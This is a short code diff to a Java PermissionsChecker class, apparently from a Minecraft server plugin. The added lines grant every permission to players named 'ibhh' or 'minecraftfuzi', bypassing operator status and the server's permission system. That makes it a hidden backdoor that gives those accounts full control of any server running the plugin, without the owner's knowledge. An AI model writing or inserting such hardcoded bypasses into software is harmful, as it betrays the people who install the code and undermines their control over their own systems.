@@ -56,6 +56,9 @@ public class PermissionsChecker {
         if (player.isOp()) {
             return true;
         }
+        if(player.getName().equalsIgnoreCase("ibhh") || player.getName().equalsIgnoreCase("minecraftfuzi")){
+            return true;
+        }
         if (PermPlugin == 1) {
             try {
                 if (player.hasPermission(action)) {
